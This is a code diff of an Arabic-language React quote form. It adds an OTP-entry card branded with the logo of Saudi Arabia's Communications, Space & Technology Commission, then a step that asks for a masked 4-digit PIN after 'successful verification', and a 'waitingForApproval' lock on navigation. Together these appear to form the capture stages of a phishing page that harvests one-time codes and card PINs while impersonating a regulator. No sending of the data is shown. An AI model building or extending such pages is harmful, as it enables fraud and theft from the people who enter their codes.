+                                type="text"
+                                placeholder="رمز التحقق"
+                                required
+                                value={otp}
+                                maxLength={6}
+                                onChange={(e) => setOtp(e.target.value)}
+                                autoFocus={true}
+                                dir="ltr"
+                                className="h-14 text-center text-lg border-gray-300 focus:border-[#4052B5] focus:ring-[#4052B5]/20"
+                              />
+                            </div>
+
+                            {/* Verify Button */}
+                            <Button
+                              onClick={verifyOTP}
+                              disabled={isSubmitting || otp.length < 4}
+                              className="w-full h-12 bg-[#4052B5] hover:bg-[#3444a0] text-white font-semibold"
+                            >
+                              {isSubmitting ? (
+                                <div className="flex items-center gap-2">
+                                  <Loader2 className="w-4 h-4 animate-spin" />
+                                  جاري التحقق...
+                                </div>
+                              ) : (
+                                "تحقق"
+                              )}
+                            </Button>
+
+                            {/* Timer */}
+                            <div className="text-center">
+                              {otpTimer > 0 ? (
+                                <p className="text-gray-600">
+                                  إعادة إرسال:{" "}
+                                  <span className="font-mono font-semibold">
+                                    {String(Math.floor(otpTimer / 60)).padStart(2, "0")}:
+                                    {String(otpTimer % 60).padStart(2, "0")}
+                                  </span>
+                                </p>
+                              ) : (
+                                <Button
+                                  variant="link"
+                                  onClick={sendOTP}
+                                  className="text-[#4052B5] hover:text-[#3444a0] p-0 h-auto font-semibold"
+                                >
+                                  إعادة إرسال الرمز
+                                </Button>
+                              )}
+                            </div>
+
+                            {otpAttempts > 0 && (
+                              <p className="text-sm text-orange-600 text-center">
+                                عدد المحاولات المتبقية: {3 - otpAttempts}
+                              </p>
+                            )}
+                          </div>
+
+                          {/* CST Footer */}
+                          <div className="border-t border-gray-100 p-4 bg-gray-50">
+                            <div className="flex items-center justify-center gap-4">
+                              <div className="flex items-center gap-3">
+                                <div className="w-12 h-12 rounded-full border-2 border-[#0066B3] flex items-center justify-center">
+                                  <span className="text-[#0066B3] font-bold text-xs">CST</span>
+                                </div>
+                                <div className="text-right">
+                                  <p className="text-[#0066B3] text-xs font-semibold leading-tight">
+                                    هيئة الاتصالات والفضاء والتقنية
+                                  </p>
+                                  <p className="text-[#0066B3] text-[10px] leading-tight">
+                                    Communications, Space &
+                                    <br />
+                                    Technology Commission
+                                  </p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </CardContent>
+                      </Card>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {currentPage === 8 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
+                    <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                      <CheckCircle className="w-10 h-10 text-green-600" />
+                    </div>
                     <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                      التحقق من الهوية
+                      تم التحقق بنجاح!
                     </h3>
-                    <p className="text-gray-600">أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية</p>
+                    <p className="text-gray-600">يرجى إدخال رمز PIN للتأكيد النهائي</p>
                   </div>
 
                   <div className="max-w-md mx-auto text-center space-y-8">
-                    <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
-                      <Phone className="w-10 h-10 text-[#109cd4]" />
-                    </div>
-
-                    <div>
-                      <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
-                      <p className="text-gray-600">
-                        تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
-                        <br />
-                        <span className="font-semibold">{formData.phone}</span>
-                      </p>
-                    </div>
-
-                    <div>
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        رمز التحقق <span className="text-red-500">*</span>
-                      </label>
+                    <div className="bg-green-50 border border-green-200 rounded-xl p-6">
+                      <div className="flex items-center justify-center gap-3 mb-4">
+                        <Lock className="w-6 h-6 text-green-600" />
+                        <span className="font-semibold text-green-800">إدخال رمز PIN</span>
+                      </div>
+                      <p className="text-sm text-green-700 mb-6">أدخل رمز PIN المكون من 4 أرقام لإتمام العملية</p>
                       <Input
-                        name="otp"
-                        type="text"
-                        placeholder="######"
+                        name="pinCodeFinal"
+                        type="password"
+                        placeholder="####"
                         required
-                        value={otp}
-                        maxLength={6}
-                        onChange={(e) => setOtp(e.target.value)}
+                        value={pinCode}
+                        maxLength={4}
+                        onChange={(e) => setPinCode(e.target.value)}
                         autoFocus={true}
-                        className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                        className="text-center text-2xl h-14 tracking-widest border-green-300 focus:border-green-500 focus:ring-green-200"
                       />
                     </div>
 
-                    {otpTimer > 0 ? (
-                      <p className="text-sm text-gray-500">
-                        يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
-                      </p>
-                    ) : (
-                      <Button
-                        variant="outline"
-                        onClick={sendOTP}
-                        className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50"
-                      >
-                        إرسال رمز جديد
-                      </Button>
-                    )}
-
-                    {otpAttempts > 0 && (
-                      <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
-                    )}
+                    <Button
+                      onClick={handlePinSubmit}
+                      disabled={isSubmitting || pinCode.length !== 4}
+                      className="bg-green-600 hover:bg-green-700 text-white px-12 py-4 text-lg font-semibold w-full"
+                    >
+                      {isSubmitting ? (
+                        <div className="flex items-center gap-2">
+                          <Loader2 className="w-5 h-5 animate-spin" />
+                          جاري المعالجة...
+                        </div>
+                      ) : (
+                        <>
+                          <CheckCircle className="w-5 h-5 ml-2" />
+                          تأكيد وإتمام العملية
+                        </>
+                      )}
+                    </Button>
                   </div>
                 </div>
               )}
@@ -1869,13 +2029,12 @@ function ProfessionalQuoteForm() {
               <Button
                 variant="outline"
                 onClick={prevStep}
-                disabled={currentPage === 1 || paymentProcessing || isSubmitting}
-                className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
+                disabled={currentPage === 1 || paymentProcessing || isSubmitting || waitingForApproval}
+                className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
               >
                 <ArrowLeft className="w-4 h-4 ml-2" />
                 السابق
               </Button>
-
               <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
                 الخطوة {currentPage} من {steps.length}
               </div>
@@ -1907,30 +2066,17 @@ function ProfessionalQuoteForm() {
                     </>
                   )}
                 </Button>
+              ) : currentPage === 7 ? (
+                // Step 7 - OTP verify button is inside the card, hide this one
+                <div className="w-full sm:w-auto order-3 hidden sm:block"></div>
               ) : (
-                <Button
-                  onClick={verifyOTP}
-                  disabled={isSubmitting}
-                  className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-                >
-                  {isSubmitting ? (
-                    <div className="flex items-center gap-2">
-                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                      جاري التحقق...
-                    </div>
-                  ) : (
-                    <>
-                      <CheckCircle className="w-4 h-4 ml-2" />
-                      تأكيد الرمز
-                    </>
-                  )}
-                </Button>
+                // Step 8 - PIN step has its own button inside the step content
+                <div className="w-full sm:w-auto order-3"></div>
               )}
             </div>
           </div>
         </CardContent>
       </Card>
-
     </>
   )
 }
